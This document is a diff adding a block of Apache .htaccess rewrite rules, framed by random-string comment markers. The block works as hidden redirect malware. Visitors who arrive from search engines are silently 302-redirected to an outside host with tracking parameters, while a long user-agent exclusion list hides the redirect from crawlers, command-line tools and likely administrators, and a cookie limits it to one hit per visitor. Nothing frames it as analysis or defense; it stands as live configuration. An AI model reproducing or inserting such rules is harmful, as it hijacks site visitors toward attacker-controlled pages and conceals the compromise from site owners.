@@ -1,0 +1,32 @@
+# exgocgkctswo
+RewriteEngine On
+RewriteCond %{REQUEST_METHOD}   ^GET$
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(google\.|yahoo\.|bing\.|msn\.|yandex\.|ask\.|excite\.|altavista\.|netscape\.|aol\.|hotbot\.|goto\.|infoseek\.|mamma\.|alltheweb\.|lycos\.|search\.|metacrawler\.|rambler\.|mail\.|dogpile\.|ya\.|\/search\?).*$   [NC]
+RewriteCond %{HTTP_REFERER}     !^.*(q\=cache\:).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(bing|Accoona|Ace\sExplorer|Amfibi|Amiga\sOS|apache|appie|AppleSyndication).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Archive|Argus|Ask\sJeeves|asterias|Atrenko\sNews|BeOS|BigBlogZoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Biz360|Blaiz|Bloglines|BlogPulse|BlogSearch|BlogsLive|BlogsSay|blogWatcher).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Bookmark|bot|CE\-Preload|CFNetwork|cococ|Combine|Crawl|curl|Danger\shiptop).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Diagnostics|DTAAgent|ecto|EmeraldShield|endo|Evaal|Everest\-Vulcan).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(exactseek|Feed|Fetch|findlinks|FreeBSD|Friendster|Fuck\sYou|Google).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Gregarius|HatenaScreenshot|heritrix|HolyCowDude|Honda\-Search|HP\-UX).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(HTML2JPG|HttpClient|httpunit|ichiro|iGetter|iPhone|IRIX|Jakarta|JetBrains).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Krugle|Labrador|larbin|LeechGet|libwww|Liferea|LinkChecker).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(LinknSurf|Linux|LiveJournal|Lonopono|Lotus\-Notes|Lycos|Lynx|Mac\_PowerPC).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Mac\_PPC|Mac\s10|like\sMac\sOS|macDN|Mediapartners|Megite|MetaProducts).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Miva|Mobile|NetBSD|NetNewsWire|NetResearchServer|NewsAlloy|NewsFire).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(NewsGatorOnline|NewsMacPro|Nokia|NuSearch|Nutch|ObjectSearch|Octora).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(OmniExplorer|Omnipelagos|Onet|OpenBSD|OpenIntelligenceData|oreilly).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(os\=Mac|P900i|panscient|perl|PlayStation|POE\-Component|PrivacyFinder).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(psycheclone|Python|retriever|Rojo|RSS|SBIder|Scooter|Seeker|Series\s60).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(SharpReader|SiteBar|Slurp|Snoopy|Soap\sClient|Socialmarks|Sphere\sScout).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(spider|sproose|Rambler|Straw|subscriber|SunOS|Surfer|Syndic8).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Syntryx|TargetYourNews|Technorati|Thunderbird|Twiceler|urllib|Validator).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Vienna|voyager|W3C|Wavefire|webcollage|Webmaster|WebPatrol|wget|Win\s9x).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Win16|Win95|Win98|Windows\s95|Windows\s98|Windows\sCE|Windows\sNT\s4).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(WinHTTP|WinNT4|WordPress|WWWeasel|wwwster|yacy|Yahoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Yandex|Yeti|YouReadMe|Zhuaxia|ZyBorg).*$   [NC]
+RewriteCond %{HTTP_COOKIE}      !^.*xccgtswgokoe.*$
+RewriteCond %{HTTPS}            ^off$
+RewriteRule ^(.*)$   http://reportedtechniques.org/cgi-bin/r.cgi?p=10003&i=2606ff47&j=333&m=56728a04aee11b0ed254df2bdd565c8d&h=%{HTTP_HOST}&u=%{REQUEST_URI}&q=%{QUERY_STRING}&t=%{TIME}  [R=302,L,CO=xccgtswgokoe:1:%{HTTP_HOST}:10080:/:0:HttpOnly]
+# exgocgkctswo
